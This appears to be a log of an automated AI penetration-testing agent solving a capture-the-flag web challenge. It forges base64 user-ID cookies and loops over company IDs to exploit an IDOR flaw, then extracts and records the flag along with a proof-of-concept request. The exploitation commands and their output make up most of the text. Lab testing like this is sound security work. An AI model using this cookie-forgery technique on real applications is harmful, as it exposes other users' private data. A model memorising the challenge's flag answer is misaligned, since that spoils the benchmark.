+                             * using HTTP/1.x                                   
+                             > GET /company/1/jobs HTTP/1.1                     
+                             > Host: 172.17.0.1:49433                           
+                             > User-Agent: curl/8.19.0                          
+                             > Accept: */*                                      
+                             > Cookie: access_token="Bearer MQ=="               
+                             >                                                  
+                             * Request completely sent off                      
+                             < HTTP/1.1 200 OK                                  
+                             < date: Sun, 12 Apr 2026 21:18:17 GMT              
+                             < server: uvicorn                                  
+                             < content-length: 956                              
+                             < content-type: text/html;                         
+                             charset=utf-8                                      
+                             <                                                  
+                             { [956 bytes data]                                 
+                                                                                
+                             100    956 100    956   0      0                   
+                             66384      0                                       
+                             0                                                  
+                             100    956 100    956   0      0                   
+                             66026      0                                       
+                             0                                                  
+                             100    956 100    956   0      0                   
+                             65403      0                                       
+                             0                                                  
+                             * Connection #0 to host                            
+                             172.17.0.1:49433 left intact                       
+                             <!DOCTYPE html>                                    
+                             <html lang="en">                                   
+                             <head>                                             
+                                 <meta charset="UTF-8">                         
+                                 <meta name="viewport"                          
+                             content="width=device-width,                       
+                             initial-scale=1.0">                                
+                                 <link rel="stylesheet"                         
+                             href="https://stackpath.bootstrapcdn.c             
+                             om/bootstrap/4.5.2/css/bootstrap.min.c             
+                             ss">                                               
+                                 <title>Jobs</title>                            
+                                 <style>                                        
+                                     body {                                     
+                                         display: flex;                         
+                                     }                                          
+                                     .nav {                                     
+                                         width: 200px;                          
+                                     }                                          
+                                     .content {                                 
+                                         flex-grow: 1;                          
+                                         padding: 20px;                         
+                                     }                                          
+                                 </style>                                       
+                             </head>                                            
+                             <body>                                             
+                                 <div class="nav flex-column                    
+                             nav-pills"                                         
+                             aria-orientation="vertical">                       
+                                                                                
+                                     <a class="nav-link"                        
+                             href="/company/1/jobs">View Jobs</a>               
+                                     <a class="nav-link"                        
+                             href="/edit_profile/1">Edit                        
+                             Profile</a>                                        
+                                                                                
+                                                                                
+                                 </div>                                         
+                                 <div class="content">                          
+                                                                                
+                             <h2>Jobs for Company 1</h2>                        
+                             <ul class="list-group">                            
+                                                                                
+                                 <li class="list-group-item">                   
+                                     <p>demo Job 1:demo Job 1                   
+                             Description</p>                                    
+                                 </li>                                          
+                                                                                
+                             </ul>                                              
+                                                                                
+                                 </div>                                         
+                             </body>                                            
+                             </html>                                            
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:24] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    kali                      logger.py:56
+                             args={"command": "for i in $(seq 1                 
+                             20); do\n  B64=$(echo -n \"$i\" |                  
+                             base64)\n                                          
+                             COOKIE=\"access_token=\\\"Bearer                   
+                             $B64\\\"\"\n  echo \"=== User $i                   
+                             (cookie: $B64) ===\"\n  curl -s                    
+                             \"http://172.17.0.1:49433/company/$i/j             
+                             obs\" -H \"Cookie: $COOKIE\" | grep -E             
+                             \"(flag\\{|Company [0-9]|Job|demo)\" |             
+                             head -5\n  echo \"\"\ndone",                       
+                             "timeout": 600}                                    
+                    DEBUG    RAW_STDOUT   kali                      logger.py:67
+                             === User 1 (cookie: MQ==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/1/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 1</h2>                        
+                                     <p>demo Job 1:demo Job 1                   
+                             Description</p>                                    
+                                                                                
+                             === User 2 (cookie: Mg==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/2/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 2</h2>                        
+                                     <p>company2 Job 1:company2 Job             
+                             1 Description</p>                                  
+                                     <p>secret:flag{0d8ca439-1cc2-4             
+                             de9-a83f-08182aede041}</p>                         
+                                                                                
+                             === User 3 (cookie: Mw==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/3/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 3</h2>                        
+                                     <p>company3 Job 1:company3 Job             
+                             1 Description</p>                                  
+                                                                                
+                             === User 4 (cookie: NA==) ===                      
+                                                                                
+                             === User 5 (cookie: NQ==) ===                      
+                                                                                
+                             === User 6 (cookie: Ng==) ===                      
+                                                                                
+                             === User 7 (cookie: Nw==) ===                      
+                                                                                
+                             === User 8 (cookie: OA==) ===                      
+                                                                                
+                             === User 9 (cookie: OQ==) ===                      
+                                                                                
+                             === User 10 (cookie: MTA=) ===                     
+                                                                                
+                             === User 11 (cookie: MTE=) ===                     
+                                                                                
+                             === User 12 (cookie: MTI=) ===                     
+                                                                                
+                             === User 13 (cookie: MTM=) ===                     
+                                                                                
+                             === User 14 (cookie: MTQ=) ===                     
+                                                                                
+                             === User 15 (cookie: MTU=) ===                     
+                                                                                
+                             === User 16 (cookie: MTY=) ===                     
+                                                                                
+                             === User 17 (cookie: MTc=) ===                     
+                                                                                
+                             === User 18 (cookie: MTg=) ===                     
+                                                                                
+                             === User 19 (cookie: MTk=) ===                     
+                                                                                
+                             === User 20 (cookie: MjA=) ===                     
+                    INFO     TOOL_RESULT  kali                      logger.py:61
+                             === User 1 (cookie: MQ==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/1/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 1</h2>                        
+                                     <p>demo Job 1:demo Job 1                   
+                             Description</p>                                    
+                                                                                
+                             === User 2 (cookie: Mg==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/2/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 2</h2>                        
+                                     <p>company2 Job 1:company2 Job             
+                             1 Description</p>                                  
+                                     <p>secret:flag{0d8ca439-1cc2-4             
+                             de9-a83f-08182aede041}</p>                         
+                                                                                
+                             === User 3 (cookie: Mw==) ===                      
+                                 <title>Jobs</title>                            
+                                     <a class="nav-link"                        
+                             href="/company/3/jobs">View Jobs</a>               
+                             <h2>Jobs for Company 3</h2>                        
+                                     <p>company3 Job 1:company3 Job             
+                             1 Description</p>                                  
+                                                                                
+                             === User 4 (cookie: NA==) ===                      
+                                                                                
+                             === User 5 (cookie: NQ==) ===                      
+                                                                                
+                             === User 6 (cookie: Ng==) ===                      
+                                                                                
+                             === User 7 (cookie: Nw==) ===                      
+                                                                                
+                             === User 8 (cookie: OA==) ===                      
+                                                                                
+                             === User 9 (cookie: OQ==) ===                      
+                                                                                
+                             === User 10 (cookie: MTA=) ===                     
+                                                                                
+                             === User 11 (cookie: MTE=) ===                     
+                                                                                
+                             === User 12 (cookie: MTI=) ===                     
+                                                                                
+                             === User 13 (cookie: MTM=) ===                     
+                                                                                
+                             === User 14 (cookie: MTQ=) ===                     
+                                                                                
+                             === User 15 (cookie: MTU=) ===                     
+                                                                                
+                             === User 16 (cookie: MTY=) ===                     
+                                                                                
+                             === User 17 (cookie: MTc=) ===                     
+                                                                                
+                             === User 18 (cookie: MTg=) ===                     
+                                                                                
+                             === User 19 (cookie: MTk=) ===                     
+                                                                                
+                             === User 20 (cookie: MjA=) ===                     
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:32] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433/company/2/job             
+                             s", "method": "GET", "poc": true}                  
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {"error": "Cannot connect to host                  
+                             127.0.0.1:8080 ssl:False [Connect call             
+                             failed ('127.0.0.1', 8080)]", "hint":              
+                             "If poc=true, make sure Burp Suite is              
+                             open with proxy on                                 
+                             http://127.0.0.1:8080"}                            
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:34] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433/company/2/job             
+                             s", "method": "GET", "poc": false}                 
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Date": "Sun, 12 Apr 2026 21:18:33             
+                             GMT",                                              
+                                 "Server": "uvicorn",                           
+                                 "Content-Length": "1077",                      
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8"                                     
+                               },                                               
+                               "body": "<!DOCTYPE html>\n<html                  
+                             lang=\"en\">\n<head>\n    <meta                    
+                             charset=\"UTF-8\">\n    <meta                      
+                             name=\"viewport\"                                  
+                             content=\"width=device-width,                      
+                             initial-scale=1.0\">\n    <link                    
+                             rel=\"stylesheet\"                                 
+                             href=\"https://stackpath.bootstrapcdn.             
+                             com/bootstrap/4.5.2/css/bootstrap.min.             
+                             css\">\n    <title>Jobs</title>\n                  
+                             <style>\n        body {\n                          
+                             display: flex;\n        }\n                        
+                             .nav {\n            width: 200px;\n                
+                             }\n        .content {\n                            
+                             flex-grow: 1;\n            padding:                
+                             20px;\n        }\n                                 
+                             </style>\n</head>\n<body>\n    <div                
+                             class=\"nav flex-column nav-pills\"                
+                             aria-orientation=\"vertical\">\n                   
+                             \n        <a class=\"nav-link\"                    
+                             href=\"/company/2/jobs\">View                      
+                             Jobs</a>\n        <a                               
+                             class=\"nav-link\"                                 
+                             href=\"/edit_profile/2\">Edit                      
+                             Profile</a>\n        \n\n    </div>\n              
+                             <div class=\"content\">\n                          
+                             \n<h2>Jobs for Company 2</h2>\n<ul                 
+                             class=\"list-group\">\n    \n    <li               
+                             class=\"list-group-item\">\n                       
+                             <p>company2 Job 1:company2 Job 1                   
+                             Description</p>\n    </li>\n    \n                 
+                             <li class=\"list-group-item\">\n                   
+                             <p>secret:flag{0d8ca439-1cc2-4de9-a83f             
+                             -08182aede041}</p>\n    </li>\n                    
+                             \n</ul>\n\n                                        
+                             </div>\n</body>\n</html>",                         
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:42] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    WARNING  FINDING      [CRITICAL]  IDOR via      logger.py:74
+                             Base64-Encoded User ID Cookie - Flag               
+                             Extracted  @                                       
+                             http://172.17.0.1:49433/company/2/jobs             
+[04/12/26 21:18:46] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_RESULT  save_poc                  logger.py:61
+                             {"saved":                                          
+                             "/root/agent-smith/pocs/20260412_21184             
+                             6_idor-base64-cookie-company2-flag.htt             
+                             p", "hint": "Open Burp Repeater and                
+                             paste this file to load the request"}              
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:18:50] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     DIAGRAM      CTF App Architecture -    logger.py:79
+                             IDOR Vulnerability                                 
+[04/12/26 21:18:53] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         complete blocked: NO      logger.py:84
+                             SPIDER: httpx confirmed web targets                
+                             but spider was never called. Run                   
+                             scan(tool='spider', target=url) to                 
+                             crawl the application before                       
+                             completing.                                        
+[04/12/26 21:18:55] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    spider                    logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49433", "depth":                
+                             "3", "flags": ""}                                  
+[04/12/26 21:19:06] INFO     TOOL_RESULT  spider                    logger.py:61
+                             http://172.17.0.1:49433                            
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:19:08] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Scan complete — CTF flag  logger.py:84
+                             extracted:                                         
+                             flag{0d8ca439-1cc2-4de9-a83f-08182aede             
+                             041}. IDOR via base64-encoded user ID              
+                             in access_token cookie. Login as                   
+                             demo/demo gets cookie with                         
+                             base64('1'), changing to base64('2')               
+                             grants access to company 2's private               
+                             job listings containing the flag.                  
